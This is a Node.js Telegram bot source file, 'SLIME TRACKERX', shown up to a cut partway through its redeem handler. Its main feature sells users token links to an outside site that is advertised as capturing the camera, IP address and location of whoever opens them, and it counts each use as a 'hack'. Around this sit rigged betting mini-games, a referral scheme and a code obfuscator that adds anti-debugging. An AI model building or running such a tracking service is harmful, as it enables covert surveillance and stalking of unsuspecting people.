// =====================================================
// 🟢⚡ SLIME TRACKERX v2.0 ⚡🟢
// 💻 CYBER ANALYTICS CORE - ULTIMATE EDITION
// =====================================================
// 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
// 🤖 Bot: @trackersxbot
// 💰 Games: Win = get your bet back + 1 coin (x1 payout) | Daily: 2 coins | Work: 1 coin (6h)
// 🛠 DEV TOOLS | 🎮 INTERACTIVE GAMES | 💾 AUTO SAVE
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const fs = require("fs");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== FORCE CLEAN START ==========
const cleanup = async () => {
    try {
        await bot.telegram.deleteWebhook();
        console.log("✅ Webhook cleared");
    } catch(e) {
        console.log("Webhook clear skipped");
    }
};
cleanup();

app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;
const DATA_FILE = "data.json";

// ========== COINS ==========
const TRACK_COST = 5;
const NEW_COINS = 5;
const REF_REWARD = 2;
const DAILY_REWARD = 2;
const WORK_REWARD = 1;
const WORK_CD = 6 * 60 * 60 * 1000;

// ========== DATABASES ==========
let users = new Map();
let tokens = new Map();
let codes = new Map();
let warns = new Map();
let workCD = new Map();
let antiLink = new Set();
let antiSpam = new Set();
let spamTrack = new Map();
let welcome = new Map();
let goodbye = new Map();
let tagCD = new Map();
let banned = new Set();
let gameSessions = new Map();
let afk = new Map();
let notes = new Map();
let activeChats = new Map();

let stats = {
  start: Date.now(),
  users: 0,
  coins: 0,
  hacks: 0,
  refs: 0,
  games: 0
};

// ========== DATABASE SAVE/LOAD ==========
function saveData() {
  try {
    const data = {
      users: Array.from(users.entries()),
      codes: Array.from(codes.entries()),
      stats: stats,
      banned: Array.from(banned),
      warns: Array.from(warns.entries()),
      workCD: Array.from(workCD.entries()),
      welcome: Array.from(welcome.entries()),
      goodbye: Array.from(goodbye.entries()),
      antiLink: Array.from(antiLink),
      antiSpam: Array.from(antiSpam)
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
    console.log("💾 Data saved!");
  } catch(e) {
    console.log("Error saving data:", e);
  }
}

function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
      users = new Map(data.users);
      codes = new Map(data.codes);
      stats = data.stats;
      banned = new Set(data.banned);
      warns = new Map(data.warns);
      workCD = new Map(data.workCD);
      welcome = new Map(data.welcome);
      goodbye = new Map(data.goodbye);
      antiLink = new Set(data.antiLink);
      antiSpam = new Set(data.antiSpam);
      console.log("📂 Data loaded! Users:", users.size);
    }
  } catch(e) {
    console.log("No saved data found, starting fresh");
  }
}

// Load data on startup
loadData();

// Auto-save every 30 seconds
setInterval(() => {
  saveData();
}, 30000);

// Clean tokens
setInterval(() => {
  let now = Date.now();
  for (let [k, v] of tokens) {
    if (now - v.time > 600000) tokens.delete(k);
  }
}, 60000);

// ========== HELPER FUNCTIONS ==========
function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
}

function genToken() {
  return crypto.randomBytes(8).toString("hex");
}

async function getName(id) {
  try {
    let chat = await bot.telegram.getChat(id);
    return chat.username || `User_${id}`;
  } catch {
    return `User_${id}`;
  }
}

// ========== XP SYSTEM ==========
function addXP(id, amount) {
  let u = users.get(id);
  if (u) {
    u.xp = (u.xp || 0) + amount;
    let needed = (u.level || 1) * 100;
    if (u.xp >= needed) {
      u.xp -= needed;
      u.level = (u.level || 1) + 1;
      let reward = u.level * 2;
      u.coins += reward;
      bot.telegram.sendMessage(id, `🎉 LEVEL UP! Level ${u.level}! +${reward} COINS`);
      saveData();
    }
    users.set(id, u);
    return true;
  }
  return false;
}

// ========== USER SYSTEM ==========
function initUser(id, ref = null) {
  if (!users.has(id)) {
    let data = {
      id: id,
      join: Date.now(),
      coins: NEW_COINS,
      totalEarned: NEW_COINS,
      refs: 0,
      referrer: ref,
      hacks: 0,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      games: 0,
      wins: 0,
      losses: 0,
      badges: ["🎁 New User"]
    };
    users.set(id, data);
    stats.users++;
    stats.coins += NEW_COINS;
    
    if (ref && users.has(ref)) {
      let r = users.get(ref);
      r.coins += REF_REWARD;
      r.refs++;
      r.totalEarned += REF_REWARD;
      r.badges.push("🌟 Recruiter");
      users.set(ref, r);
      stats.refs++;
      stats.coins += REF_REWARD;
      bot.telegram.sendMessage(ref, `🎉 NEW REFERRAL! +${REF_REWARD} COINS\n💰 ${r.coins} coins | 👥 ${r.refs} refs`);
      saveData();
    }
    saveData();
  }
  return users.get(id);
}

function addCoin(id, amt) {
  let u = users.get(id);
  if (u) {
    u.coins += amt;
    u.totalEarned += amt;
    users.set(id, u);
    stats.coins += amt;
    saveData();
    return true;
  }
  return false;
}

function takeCoin(id, amt) {
  let u = users.get(id);
  if (u && u.coins >= amt) {
    u.coins -= amt;
    users.set(id, u);
    saveData();
    return true;
  }
  return false;
}

function canHack(id) {
  let u = users.get(id);
  return u && u.coins >= TRACK_COST;
}

function useHack(id) {
  let u = users.get(id);
  if (u && u.coins >= TRACK_COST) {
    u.coins -= TRACK_COST;
    u.hacks++;
    users.set(id, u);
    stats.hacks++;
    saveData();
    return true;
  }
  return false;
}

function genCode(coins, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  codes.set(code, {
    coins: coins,
    used: [],
    max: Math.min(uses, 20),
    left: Math.min(uses, 20),
    expire: Date.now() + (hours * 3600000)
  });
  saveData();
  return code;
}

function redeemCode(id, code) {
  let c = codes.get(code.toUpperCase());
  if (!c) return { ok: false, msg: "❌ Invalid code!" };
  if (Date.now() > c.expire) return { ok: false, msg: "❌ Code expired!" };
  if (c.left <= 0) return { ok: false, msg: "❌ Code used up!" };
  if (c.used.includes(id)) return { ok: false, msg: "❌ Already used!" };
  addCoin(id, c.coins);
  c.used.push(id);
  c.left--;
  codes.set(code, c);
  saveData();
  return { ok: true, msg: `✅ +${c.coins} COINS`, coins: c.coins };
}

// ========== DEV TOOLS FUNCTIONS ==========
function obfuscateCode(code) {
  try {
    let ob = code.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\s+/g, ' ');
    let vars = new Set();
    let regex = /\b(let|const|var)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
    let m;
    while ((m = regex.exec(ob)) !== null) vars.add(m[2]);
    let map = new Map();
    for (let v of vars) map.set(v, '_' + crypto.randomBytes(4).toString('hex'));
    for (let [old, neu] of map) ob = ob.replace(new RegExp(`\\b${old}\\b`, 'g'), neu);
    ob = ob.replace(/(['"])(.*?)\1/g, (_, q, s) => `atob('${Buffer.from(s).toString('base64')}')`);
    let antiDebug = `(function(){const start=performance.now();debugger;const end=performance.now();if(end-start>100){console.clear();setTimeout(()=>{location.reload();},100);}})();`;
    ob = antiDebug + ob;
    return { ok: true, ob, orig: code.length, new: ob.length, comp: Math.round((1 - ob.length / code.length) * 100) };
  } catch(e) { return { ok: false, error: e.message }; }
}

function minifyCode(code) {
  try {
    let min = code.replace(/\/\/.*$/gm, '').replace(/\/\*[\s\S]*?\*\//g, '').replace(/\s+/g, ' ').replace(/;\s*/g, ';').replace(/\{\s+/g, '{').replace(/\s+\}/g, '}').trim();
    return { ok: true, min };
  } catch(e) { return { ok: false, error: e.message }; }
}

function validateCode(code) {
  try { new Function(code); return { ok: true }; } 
  catch(e) { return { ok: false, error: e.message }; }
}

// ========== JOIN CHECK ==========
async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== MENUS ==========
function mainMenu(ctx) {
  let link = refLink(ctx.from.id);
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎯 TRACKING", "track"), Markup.button.callback("👑 GROUP", "group")],
    [Markup.button.callback("🎮 GAMES", "games"), Markup.button.callback("💰 ECONOMY", "eco")],
    [Markup.button.callback("🏆 LEADERBOARD", "lead"), Markup.button.callback("🛠 DEV TOOLS", "devtools")],
    [Markup.button.callback("👤 PROFILE", "prof"), Markup.button.callback("📊 STATS", "stats")],
    [Markup.button.callback("🎁 REDEEM", "redeem"), Markup.button.callback("🔗 REFERRAL", "refinfo")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
    [Markup.button.url("📋 MY LINK", link)]
  ]);
}

function trackMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎱 POOL", "pool"), Markup.button.callback("⚡ NORMAL", "norm")],
    [Markup.button.callback("◀️ BACK", "back")]
  ]);
}

function groupMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔊 TAG ALL", "tag"), Markup.button.callback("👋 WELCOME", "setw")],
    [Markup.button.callback("👋 GOODBYE", "setg"), Markup.button.callback("🚫 ANTILINK", "alink")],
    [Markup.button.callback("🛡️ ANTISPAM", "aspam"), Markup.button.callback("⚠️ WARN", "warn")],
    [Markup.button.callback("🔨 KICK", "kick"), Markup.button.callback("🚫 BAN", "ban")],
    [Markup.button.callback("🔇 MUTE", "mute"), Markup.button.callback("📊 STATS", "gstats")],
    [Markup.button.callback("◀️ BACK", "back")]
  ]);
}

function gamesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎲 DICE", "dice"), Markup.button.callback("🎰 SLOTS", "slots")],
    [Markup.button.callback("🔢 GUESS", "guess"), Markup.button.callback("✊ RPS", "rps")],
    [Markup.button.callback("🪙 FLIP", "flip"), Markup.button.callback("🔥 RISK", "risk")],
    [Markup.button.callback("◀️ BACK", "back")]
  ]);
}

function ecoMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("💼 WORK", "work")],
    [Markup.button.callback("🏆 LEADERBOARD", "leadc"), Markup.button.callback("◀️ BACK", "back")]
  ]);
}

function leadMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 COINS", "topc"), Markup.button.callback("🎮 GAMES", "topg")],
    [Markup.button.callback("👥 REFERRALS", "topr"), Markup.button.callback("⭐ LEVEL", "topl")],
    [Markup.button.callback("🔧 HACKS", "toph"), Markup.button.callback("◀️ BACK", "back")]
  ]);
}

function devToolsMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔒 OBFUSCATE", "obf"), Markup.button.callback("🗜️ MINIFY", "min")],
    [Markup.button.callback("✅ VALIDATE", "val"), Markup.button.callback("🔐 ENCRYPT", "enc")],
    [Markup.button.callback("🔓 DECRYPT", "dec"), Markup.button.callback("📝 BASE64", "b64")],
    [Markup.button.callback("🔢 HASH", "hash"), Markup.button.callback("⏰ TIMESTAMP", "ts")],
    [Markup.button.callback("🎲 RANDOM", "rand"), Markup.button.callback("📋 NOTE", "note")],
    [Markup.button.callback("⏰ REMINDER", "rem"), Markup.button.callback("💤 AFK", "afk")],
    [Markup.button.callback("🔍 WHOIS", "whois"), Markup.button.callback("📊 SYSTEM", "sys")],
    [Markup.button.callback("◀️ BACK", "back")]
  ]);
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from) return next();
  if (ctx.chat?.type === "channel") return next();
  if (ctx.callbackQuery?.data === "join") return next();
  
  if (banned.has(ctx.from.id)) {
    return ctx.reply("🚫 You are banned!");
  }
  
  let joined = await checkJoin(ctx);
  if (!joined) {
    return ctx.reply(`🚫 ACCESS LOCKED\n\n🔐 Join: ${CHANNEL}`, {
      reply_markup: {
        inline_keyboard: [[
          { text: "📢 JOIN", url: "https://t.me/devxtechzone" },
          { text: "✅ JOINED", callback_data: "join" }
        ]]
      }
    });
  }
  return next();
});

// ========== START ==========
bot.start(async (ctx) => {
  let ref = null;
  let args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    ref = parseInt(args[1].replace("ref_", ""));
  }
  let user = initUser(ctx.from.id, ref);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: `🟢⚡ SLIME TRACKERX v2.0 ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n✨ Welcome ${ctx.from.first_name}!\n💰 ${user.coins} coins | 📊 Lvl ${user.level} | 👥 ${user.refs} refs\n🎁 +${NEW_COINS} FREE coins!\n\n🔗 ${refLink(ctx.from.id)}\n\n🎯 Select module`,
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

bot.action("join", async (ctx) => {
  if (!await checkJoin(ctx)) {
    return ctx.answerCbQuery("❌ Join first!", true);
  }
  await ctx.answerCbQuery("✅ Access!");
  await ctx.deleteMessage();
  let user = initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: `✅ Access Unlocked!\n💰 ${user.coins} coins\n🎯 Select module`,
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

// ========== NAVIGATION ==========
bot.action("track", async (ctx) => {
  await ctx.reply("🎯 TRACKING\n\n⚠️ 5 coins\n⏱️ 10min\n📸 Camera + IP + Location", {
    parse_mode: "HTML",
    ...trackMenu()
  });
});

bot.action("group", async (ctx) => {
  await ctx.reply("👑 GROUP TOOLS\n\nAdmin tools for moderation!", {
    parse_mode: "HTML",
    ...groupMenu()
  });
});

bot.action("games", async (ctx) => {
  await ctx.reply("🎮 GAMES ZONE\n\n💰 Bet any amount | Win = get your bet back + 1 coin!\n🎲 Click a game to play!", {
    parse_mode: "HTML",
    ...gamesMenu()
  });
});

bot.action("eco", async (ctx) => {
  let u = initUser(ctx.from.id);
  await ctx.reply(`💰 ECONOMY\n\n💰 Balance: ${u.coins} coins\n📈 Earned: ${u.totalEarned}\n\nDaily: ${DAILY_REWARD} coins | Work: ${WORK_REWARD} coin/6h | Referral: ${REF_REWARD} coins`, {
    parse_mode: "HTML",
    ...ecoMenu()
  });
});

bot.action("lead", async (ctx) => {
  await ctx.reply("🏆 LEADERBOARDS\n\nTop users!", {
    parse_mode: "HTML",
    ...leadMenu()
  });
});

bot.action("devtools", async (ctx) => {
  await ctx.reply("🛠 DEV TOOLS\n\n🔒 Obfuscate - Protect JS code\n🗜️ Minify - Compress code\n✅ Validate - Check syntax\n🔐 Encrypt - AES-256\n🔓 Decrypt - AES-256\n📝 Base64 - Encode text\n🔢 Hash - MD5/SHA256\n⏰ Timestamp - Current time\n🎲 Random - Generate numbers\n📋 Notes - Save text\n⏰ Reminders - Set alerts\n💤 AFK - Away status\n🔍 Whois - User info\n📊 System - Bot stats", {
    parse_mode: "HTML",
    ...devToolsMenu()
  });
});

bot.action("prof", async (ctx) => {
  let u = initUser(ctx.from.id);
  let winRate = u.games > 0 ? ((u.wins / u.games) * 100).toFixed(1) : 0;
  await ctx.reply(`👤 PROFILE\n\n📝 ${ctx.from.first_name}\n🆔 ${ctx.from.id}\n\n💰 ${u.coins} coins\n📊 Level ${u.level}\n👥 ${u.refs} refs\n🔧 ${u.hacks} hacks\n🎮 ${u.wins}W/${u.losses}L (${winRate}%)\n\n🏆 Badges:\n${u.badges.map(b => `• ${b}`).join('\n')}`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("🔄 REFRESH", "prof"), Markup.button.callback("◀️ BACK", "back")]])
  });
});

bot.action("stats", async (ctx) => {
  let totalCoins = Array.from(users.values()).reduce((s, u) => s + u.coins, 0);
  await ctx.reply(`📊 BOT STATS\n\n👥 Users: ${users.size}\n💰 Total Coins: ${totalCoins}\n🎯 Hacks: ${stats.hacks}\n🎮 Games: ${stats.games}\n🎁 Referrals: ${stats.refs}\n⏱️ Uptime: ${Math.floor((Date.now() - stats.start) / 3600000)}h`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "back")]])
  });
});

bot.action("back", async (ctx) => {
  let u = initUser(ctx.from.id);
  await ctx.reply(`🟢⚡ SLIME TRACKERX v2.0 ⚡🟢\n💻 CYBER ANALYTICS CORE\n\n💰 ${u.coins} coins | 📊 Lvl ${u.level} | 👥 ${u.refs} refs\n\n🎯 Select module`, {
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

// ========== TRACKING ==========
bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  }
  useHack(ctx.from.id);
  let token = genToken();
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() });
  setTimeout(() => tokens.delete(token), 600000);
  await ctx.reply(`🎱 POOL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]])
  });
});

bot.action("norm", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  }
  useHack(ctx.from.id);
  let token = genToken();
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, time: Date.now() });
  setTimeout(() => tokens.delete(token), 600000);
  await ctx.reply(`⚡ NORMAL MODE\n\n✅ Ready!\n💰 -${TRACK_COST}\n⏱️ 10min\n\n🔗 ${DOMAIN}?token=${token}`, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([[Markup.button.callback("◀️ BACK", "track")]])
  });
});

// ========== GAMES ==========
bot.action("dice", async (ctx) => {
  await ctx.reply("🎲 DICE GAME\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/dice [amount]`\n\nExample: `/dice 10`\n\nWin = get your bet back + 1 coin | Lose = lose bet");
});

bot.command("dice", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>\nExample: /dice 10");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let roll = Math.floor(Math.random() * 6) + 1;
  let win = roll === 6;
  
  if (win) {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll}!\n🎉 YOU WIN!\n💰 +${w} coins!`);
  } else {
    u.losses++;
    stats.games++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll}!\n💀 YOU LOSE!\n💸 -${bet} coins!`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

bot.action("slots", async (ctx) => {
  await ctx.reply("🎰 SLOTS GAME\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/slots [amount]`\n\nExample: `/slots 10`\n\nWin = get your bet back + 1 coin | Lose = lose bet");
});

bot.command("slots", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /slots <amount>\nExample: /slots 10");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let s = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  let r = [
    s[Math.floor(Math.random() * 6)],
    s[Math.floor(Math.random() * 6)],
    s[Math.floor(Math.random() * 6)]
  ];
  let jack = r[0] === r[1] && r[1] === r[2];
  let pair = !jack && (r[0] === r[1] || r[1] === r[2] || r[0] === r[2]);
  
  if (jack || pair) {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    if (jack) {
      await ctx.reply(`🎰 JACKPOT! ${r.join(" ")}\n🎉 YOU WIN ${w} COINS!`);
    } else {
      await ctx.reply(`🎰 PAIR! ${r.join(" ")}\n🎉 YOU WIN ${w} COINS!`);
    }
  } else {
    u.losses++;
    stats.games++;
    await ctx.reply(`🎰 ${r.join(" ")}\n💀 YOU LOSE! -${bet} coins`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

bot.action("guess", async (ctx) => {
  await ctx.reply("🔢 GUESS GAME\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/guess [amount] [1-10]`\n\nExample: `/guess 10 7`\n\nWin = get your bet back + 1 coin | Lose = lose bet");
});

bot.command("guess", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let guess = parseInt(args[2]);
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /guess <amount> <1-10>\nExample: /guess 10 7");
  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess a number between 1-10!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let num = Math.floor(Math.random() * 10) + 1;
  
  if (guess === num) {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    await ctx.reply(`🎉 Correct! The number was ${num}!\n💰 YOU WIN ${w} COINS!`);
  } else {
    u.losses++;
    stats.games++;
    await ctx.reply(`❌ Wrong! The number was ${num}\n💸 YOU LOSE -${bet} coins`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

bot.action("rps", async (ctx) => {
  await ctx.reply("✊ ROCK PAPER SCISSORS\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/rps [amount] [rock/paper/scissors]`\n\nExample: `/rps 10 rock`\n\nWin = get your bet back + 1 coin | Lose = lose bet | Tie = coins back");
});

bot.command("rps", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let choice = args[2]?.toLowerCase();
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /rps <amount> <rock/paper/scissors>\nExample: /rps 10 rock");
  if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock, paper, or scissors!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
  let result;
  
  if (choice === botChoice) result = "tie";
  else if ((choice === "rock" && botChoice === "scissors") || (choice === "paper" && botChoice === "rock") || (choice === "scissors" && botChoice === "paper")) result = "win";
  else result = "lose";
  
  if (result === "win") {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🎉 YOU WIN! +${w} coins`);
  } else if (result === "lose") {
    u.losses++;
    stats.games++;
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n💀 YOU LOSE! -${bet} coins`);
  } else {
    addCoin(ctx.from.id, bet);
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🤝 TIE! Coins returned`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

bot.action("flip", async (ctx) => {
  await ctx.reply("🪙 COIN FLIP\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/flip [amount]`\n\nExample: `/flip 10`\n\nWin = get your bet back + 1 coin | Lose = lose bet");
});

bot.command("flip", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /flip <amount>\nExample: /flip 10");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let flip = Math.random() < 0.4 ? "HEADS" : "TAILS";
  
  if (flip === "HEADS") {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    await ctx.reply(`🪙 Coin landed on ${flip}!\n🎉 YOU WIN! +${w} coins`);
  } else {
    u.losses++;
    stats.games++;
    await ctx.reply(`🪙 Coin landed on ${flip}!\n💀 YOU LOSE! -${bet} coins`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

bot.action("risk", async (ctx) => {
  await ctx.reply("🔥 HIGH RISK GAME\n\n💰 Bet any amount\n\n📝 How to play:\nSend: `/risk [amount]`\n\nExample: `/risk 10`\n\nWin = get your bet back + 1 coin | Lose = lose bet");
});

bot.command("risk", async (ctx) => {
  let u = initUser(ctx.from.id);
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /risk <amount>\nExample: /risk 10");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins! You have ${u.coins}`);
  
  takeCoin(ctx.from.id, bet);
  let win = Math.random() < 0.2;
  
  if (win) {
    let w = bet + 1;
    addCoin(ctx.from.id, w);
    u.wins++;
    stats.games++;
    await ctx.reply(`🔥 HIGH RISK WIN!\n🎉 YOU WIN ${w} COINS!`);
  } else {
    u.losses++;
    stats.games++;
    await ctx.reply(`💀 HIGH RISK LOST!\n💸 YOU LOSE -${bet} coins`);
  }
  u.games++;
  users.set(ctx.from.id, u);
});

// ========== ECONOMY ==========
bot.action("daily", async (ctx) => {
  let u = initUser(ctx.from.id);
  let now = Date.now();
  if (u.lastDaily && now - u.lastDaily < 86400000) {
    let h = Math.floor((86400000 - (now - u.lastDaily)) / 3600000);
    return ctx.reply(`⏰ ${h}h left`);
  }
  let streak = u.streak || 0;
  if (u.lastDaily && now - u.lastDaily < 172800000) streak++;
  else streak = 1;
  let reward = DAILY_REWARD + Math.min(streak, 10);
  addCoin(ctx.from.id, reward);
  u.streak = streak;
  u.lastDaily = now;
  users.set(ctx.from.id, u);
  await ctx.reply(`🎁 DAILY! +${reward} coins\n🔥 Streak: ${streak}\n💰 ${u.coins + reward}`);
});

bot.action("work", async (ctx) => {
  let u = initUser(ctx.from.id);
  let now = Date.now();
  let last = workCD.get(u.id) || 0;
  if (now - last < WORK_CD) {
    let h = Math.floor((WORK_CD - (now - last)) / 3600000);
    return ctx.reply(`⏰ ${h}h left`);
  }
  let jobs = ["💻 Dev", "🎨 Design", "📝 Write", "🎮 Game", "🛒 Shop"];
  let job = jobs[Math.floor(Math.random() * jobs.length)];
  let reward = WORK_REWARD;
  addCoin(u.id, reward);
  workCD.set(u.id, now);
  await ctx.reply(`💼 ${job} +${reward} coin\n💰 ${u.coins + reward}`);
});

// ========== LEADERBOARDS ==========
bot.action("topc", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let msg = "🏆 **💰 RICHEST** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - ${top[i].coins} coins\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("topg", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.wins - a.wins).slice(0, 10);
  let msg = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - ${top[i].wins} wins\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("topr", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.refs - a.refs).slice(0, 10);
  let msg = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - ${top[i].refs} refs\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("topl", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.level - a.level).slice(0, 10);
  let msg = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - Level ${top[i].level}\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("toph", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.hacks - a.hacks).slice(0, 10);
  let msg = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - ${top[i].hacks} hacks\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

bot.action("leadc", async (ctx) => {
  let top = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let msg = "🏆 **💰 RICHEST** 🏆\n\n";
  for (let i = 0; i < top.length; i++) {
    let medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    let name = await getName(top[i].id);
    msg += `${medal} @${name} - ${top[i].coins} coins\n`;
  }
  await ctx.reply(msg, { parse_mode: "Markdown" });
});

// ========== REDEEM ==========
bot.action("redeem", async (ctx) => {
